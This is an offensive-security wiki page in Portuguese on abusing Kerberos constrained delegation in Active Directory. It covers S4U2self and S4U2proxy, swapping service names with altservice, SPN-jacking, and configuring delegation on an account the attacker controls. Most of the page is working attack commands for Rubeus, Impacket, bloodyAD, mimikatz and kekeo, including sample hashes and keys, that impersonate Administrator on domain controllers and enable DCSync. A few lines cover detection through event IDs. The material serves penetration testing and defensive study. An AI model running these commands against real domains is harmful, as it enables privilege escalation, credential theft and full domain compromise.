# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

Com isso, um administrador de domínio pode **permitir** que um computador **se passe por um usuário ou computador** perante qualquer **serviço** de uma máquina.

- **Service for User to self (_S4U2self_):** Qualquer **conta de serviço que possua um SPN** geralmente pode obter um TGS para si mesma em nome de um usuário arbitrário. Se a conta também tiver [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D) em _userAccountControl_, esse TGS será **forwardable**, o que torna a transição de protocolo diretamente útil para a **classic constrained delegation**.
- **Service for User to Proxy(_S4U2proxy_):** Uma **conta de serviço** pode obter um TGS em nome de um usuário para os SPNs listados em **msDS-AllowedToDelegateTo**. O ticket de evidência usado em S4U2Proxy precisa ser um ticket **forwardable** para o serviço que está delegando: um ticket real de cliente para serviço capturado da vítima ou um gerado com **S4U2Self + T2A4D**.

**Nota**: Se um usuário estiver marcado no AD como ‘_Account is sensitive and cannot be delegated_’ ou for membro de **Protected Users**, geralmente **não será possível se passar por ele** por meio de constrained delegation. Em domínios modernos, prefira material **AES** em vez de presumir que apenas RC4 está disponível ao visar contas com delegação habilitada.

Isso significa que, se você **comprometer o hash do serviço**, poderá **se passar por usuários** e obter **acesso** em nome deles a qualquer **serviço** nas máquinas indicadas (possível **privesc**).

Além disso, você **não terá acesso apenas ao serviço que o usuário pode representar, mas também a qualquer serviço**, porque o SPN (o nome do serviço solicitado) não é verificado (essa parte do ticket não é criptografada/assinada). Portanto, se você tiver acesso ao **serviço CIFS**, também poderá acessar o **serviço HOST** usando, por exemplo, a flag `/altservice` do Rubeus. A mesma falha de troca de SPN é explorada pelo **Impacket getST -altservice** e por outras ferramentas.

Além disso, o **acesso ao serviço LDAP no DC** é o necessário para explorar um **DCSync**.

```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Linux / LDAP enumeration
# NetExec: enumerate constrained / unconstrained / RBCD in one shot
nxc ldap dc.corp.local -u user -p 'Password123!' --find-delegation

# bloodyAD / msldap: LDAP-first enumeration from Linux
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap constrained
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap s4u2proxy
```

**Nota para o operador:** não confie apenas em capturas de tela do **ADUC** ou do BloodHound para revisar **gMSA/sMSA**. Essas contas geralmente ocultam a guia Delegação usual, então enumere diretamente os atributos brutos **`userAccountControl`** e **`msDS-AllowedToDelegateTo`**.

```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```

### Transição de protocolo vs. constrained delegation somente Kerberos

Se a conta comprometida tiver **T2A4D**, geralmente você pode concluir a cadeia completa **`S4U2Self -> S4U2Proxy`** usando apenas a chave/TGT do serviço.<sup>[[2]](#references)</sup>

Se ela tiver apenas **`msDS-AllowedToDelegateTo`** (o modo clássico **"Use Kerberos only"**), ainda pode ser possível abusar da delegação, mas o ticket de evidência para S4U2Proxy precisa ser um **ticket encaminhável de usuário para serviço** para o serviço que está delegando. Uma opção é capturar um TGS da vítima de **LSASS/ccache** e usá-lo na segunda etapa (`/tgs:` no Rubeus). Um ticket S4U2Self **não encaminhável** não é suficiente para constrained delegation clássica; se esse for seu único ticket de evidência, confira [Resource-based Constrained Delegation](resource-based-constrained-delegation.md).<sup>[[2]](#references)</sup>

Outra opção condicional é usar um primeiro salto de [RBCD](resource-based-constrained-delegation.md) até o serviço que está delegando: se ele produzir um ticket **encaminhável** para o usuário e serviço pretendidos, esse ticket pode ser testado como evidência para um salto S4U2Proxy posterior no modo Kerberos-only. Confirme os flags do primeiro ticket, o SPN do serviço que está delegando, a allow-list do alvo e quaisquer restrições de delegação do usuário; controlar apenas um atributo RBCD não comprova o segundo salto.

### Observações sobre constrained delegation entre domínios (2025+)

Desde o **Windows Server 2012/2012 R2**, o KDC oferece suporte a **constrained delegation entre domínios/florestas** por meio de extensões S4U2Proxy. Builds modernos (Windows Server 2016–2025) mantêm esse comportamento e adicionam dois SIDs PAC para indicar a transição de protocolo:<sup>[[1]](#references)</sup>

- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**) quando o usuário se autenticou normalmente.
- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**) quando um serviço afirmou a identidade por meio da transição de protocolo.

Quando a transição de protocolo é usada entre domínios, espere encontrar `SERVICE_ASSERTED_IDENTITY` dentro do PAC, confirmando que a etapa S4U2Proxy foi bem-sucedida.<sup>[[1]](#references)</sup>

### Ferramentas Impacket / Linux (altservice e S4U completo)

Versões recentes do Impacket (0.11.x+) expõem a mesma cadeia S4U e a troca de SPN que o Rubeus:<sup>[[2]](#references)</sup>

```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
         -impersonate Administrator contoso.local/websvc$ \
         -hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'

# If you already have a ticket/ccache for the right host, rewrite only the service class offline
# (same SPN-swapping idea as Rubeus /altservice)
tgssub.py -in Administrator.ccache -out Administrator_HOST.ccache -altservice host/dc.contoso.local
export KRB5CCNAME=Administrator_HOST.ccache
```

Se preferir forjar primeiro o ST do usuário (por exemplo, usando apenas o hash offline), combine **ticketer.py** com **getST.py** para S4U2Proxy. **tgssub.py** também é útil quando você já tem um ccache funcional e só precisa trocar a classe de serviço pelo mesmo host. Consulte o issue #1713 do Impacket para conhecer os problemas atuais (KRB_AP_ERR_MODIFIED quando o ST forjado não corresponde à chave do SPN).<sup>[[2]](#references)</sup>

### SPN-jacking: redirecionando um alvo de delegação restrita

A delegação restrita clássica autoriza uma **string SPN** em `msDS-AllowedToDelegateTo`, não um SID de destino imutável. Durante o S4U2Proxy, o KDC resolve a conta que possui atualmente esse SPN e criptografa o ticket de serviço com a chave de longo prazo dessa conta. Portanto, controlar a conta delegante e ter `WriteSPN` sobre outra conta de serviço/computador permite redirecionar uma restrição de delegação inalterada sem `SeEnableDelegationPrivilege`.<sup>[[5]](#references)[[6]](#references)</sup>

Existem duas variantes:<sup>[[5]](#references)</sup>

- **Ghost SPN-jacking:** o SPN permitido está órfão porque seu antigo proprietário foi excluído, renomeado ou teve o SPN removido. Adicione-o diretamente à conta de destino desejada.
- **Live SPN-jacking:** o SPN ainda pertence a uma conta de origem. A validação de SPN duplicado normalmente bloqueia a gravação no destino, então é necessário ter `WriteSPN` em ambos os objetos: remova-o da origem, adicione-o ao destino, obtenha o ticket e restaure o registro original.

O fluxo Linux abstrato a seguir move um SPN permitido, executa S4U como a principal delegante comprometida e reescreve o nome de serviço do ticket para um serviço útil no novo destino.<sup>[[5]](#references)[[6]](#references)</sup>

```bash
# Omit this deletion for a ghost SPN
bloodyAD --host "$DC" -d "$DOMAIN" -u "$WRITER" -p "$PASSWORD" \
  msldap delspn "$SOURCE_DN" "$DELEGATED_SPN"

bloodyAD --host "$DC" -d "$DOMAIN" -u "$WRITER" -p "$PASSWORD" \
  msldap addspn "$TARGET_DN" "$DELEGATED_SPN"

getST.py -dc-ip "$DC_IP" -spn "$DELEGATED_SPN" \
  -impersonate Administrator -altservice "cifs/$TARGET_FQDN" \
  "$DOMAIN/$DELEGATING_ACCOUNT:$DELEGATING_PASSWORD"
```

`-altservice` é a segunda primitiva, separada. O ticket S4U2Proxy foi criptografado para a conta que agora possui `$DELEGATED_SPN`; como o nome do serviço do ticket (`sname`) fica fora do corpo criptografado do ticket, as ferramentas podem substituir outra classe de serviço/nome de host cujo serviço use a mesma chave de conta. O SPN-jacking primeiro altera **qual chave de conta** protege o ticket, enquanto a substituição da classe de serviço altera **onde esse ticket é apresentado**.<sup>[[5]](#references)[[6]](#references)</sup>

Para fazer live jacking, reverta as duas gravações LDAP imediatamente após obter o ticket, para evitar interromper o serviço legítimo. Em DCs com auditoria de contas de computador ativada, procure o evento de Segurança **4742**, no qual `servicePrincipalName` é removido de um computador e adicionado a outro pouco depois, especialmente quando o hostname do SPN difere do `dNSHostName` do destino. Correlacione com o evento **4769**: S4U2Self apresenta a mesma conta como cliente/serviço, enquanto S4U2Proxy preenche **Transited Services**.<sup>[[5]](#references)</sup>

### Configurando a delegação em uma conta controlada

Esse caminho exige **acesso efetivo de gravação** aos atributos de delegação da conta de computador ou serviço (por exemplo, `GenericAll` ou `WriteDACL` seguido de uma alteração na ACL) **e** o direito de usuário `SeEnableDelegationPrivilege` para a conta que faz a alteração LDAP. A Microsoft exige esse privilégio quando `msDS-AllowedToDelegateTo` é modificado; direitos de controle do objeto, por si só, não o contornam. Verifique ambos os pré-requisitos antes de usar um cliente LDAP como **bloodyAD** para configurar a delegação com transição de protocolo.<sup>[[Microsoft ADTS modify-operation security checks](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/c714e48c-ea21-48b0-913d-fc065ab3dda3)]</sup>

```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```

Uma conta de computador existente pode ser candidata mesmo quando `ms-DS-MachineAccountQuota` é zero; essa quota limita a rota padrão de criação de novos computadores, não os direitos sobre um objeto existente. Para usar a delegação configurada, você também precisa controlar a chave ou a senha da conta delegante, ter um nome principal de serviço válido e um usuário-alvo cujas credenciais possam ser delegadas. Essas condições e o acesso efetivo ao diretório devem ser verificados separadamente.

- Step 1: **Obter o TGT do serviço permitido**

```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```

> [!WARNING]
> Existem **outras maneiras de obter um ticket TGT** ou o **RC4** ou **AES256** sem ser SYSTEM no computador, como Printer Bug e unconstrained delegation, NTLM relaying e abuso do Active Directory Certificate Service
>
> **Apenas tendo esse ticket TGT (ou hash), você pode realizar esse ataque sem comprometer o computador inteiro.**

- Step2: **Obter o TGS para o serviço, personificando o usuário**

```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the constrained-delegation user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```

[**Mais informações em ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) e [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)<sup>[[3]](#references)[[4]](#references)</sup>

## References

- [1] [Visão geral da Delegação Restrita do Kerberos (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [2] [Abusando da Delegação com Impacket (Parte 2): Delegação Restrita (Black Hills, 2025)](https://www.blackhillsinfosec.com/abusing-delegation-with-impacket-part-2/)
- [3] [Delegação Restrita do Kerberos (ired.team)](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
- [4] [Kerberosity Killed the Domain: Uma visão geral ofensiva do Kerberos (SpecterOps)](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [5] [Elad Shamir - SPN-jacking: um caso extremo de abuso de WriteSPN](https://www.semperis.com/blog/spn-jacking-an-edge-case-in-writespn-abuse/)
- [6] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
{{#include ../../banners/hacktricks-training.md}}
